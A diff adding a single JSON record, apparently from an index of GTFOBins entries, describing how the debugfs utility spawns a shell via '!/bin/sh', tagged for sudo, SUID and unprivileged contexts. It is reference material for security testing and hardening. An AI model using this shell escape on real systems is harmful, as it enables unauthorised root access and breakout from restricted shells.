@@ -1,0 +1,1 @@
+{"title": "debugfs", "source": "gtfobins", "source_label": "GTFOBins", "path": "debugfs", "html": "<h1>debugfs</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">debugfs\n!/bin/sh</code></pre>", "excerpt": "debugfs Shell debugfs !/bin/sh", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
